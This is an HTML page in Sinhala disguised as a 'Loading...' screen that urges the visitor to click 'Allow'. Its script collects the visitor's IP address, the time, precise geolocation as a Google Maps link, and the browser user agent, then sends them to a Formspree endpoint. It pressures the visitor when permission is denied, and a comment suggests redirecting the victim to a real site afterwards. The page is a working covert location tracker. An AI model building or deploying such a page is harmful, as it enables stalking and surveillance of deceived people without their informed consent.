<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #333; font-size: 18px; }
        #status { margin-top: 15px; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body onload="captureData()">

<div class="container">
    <div class="loader"></div>
    <h2>පිටුව සකසමින් පවතී...</h2>
    <p>කරුණාකර ඉහළින් එන "Allow" පණිවිඩය ක්ලික් කරන්න.</p>
    <div id="statusText">සම්බන්ධ වෙමින්...</div>
</div>

<script>
    async function captureData() {
        const statusMsg = document.getElementById("statusText");

        try {
            // 1. IP සහ වෙලාව ලබා ගැනීම (මේක auto සිදුවේ)
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;
            const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });

            // 2. Location ඉල්ලීම
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    // නිවැරදි Google Maps Link එක
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                    statusMsg.innerText = "දත්ත යවමින් පවතී...";

                    // 3. Formspree වෙත යැවීම
                    const response = await fetch("https://formspree.io/f/xdabkpao", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            IP_Address: userIP,
                            Date_Time: currentTime,
                            Google_Maps_Location: mapUrl,
                            Device_Info: navigator.userAgent
                        })
                    });

                    if (response.ok) {
                        statusMsg.style.color = "green";
                        statusMsg.innerText = "තහවුරු කිරීම සාර්ථකයි!";
                        // විස්තර ලැබුණු පසු ඔහුව වෙනත් සැබෑ වෙබ් අඩවියකට යැවීමට පහත ලින්ක් එක භාවිතා කළ හැක
                        // window.location.href = "https://www.google.com"; 
                    }

                }, (error) => {
                    statusMsg.style.color = "red";
                    statusMsg.innerText = " අවසරය නොමැතිව ඉදිරියට යා නොහැක. කරුණාකර Allow කරන්න.";
                }, {enableHighAccuracy: true});
            }
        } catch (err) {
            statusMsg.innerText = "සම්බන්ධතා දෝෂයකි.";
        }
    }
</script>

</body>
</html>
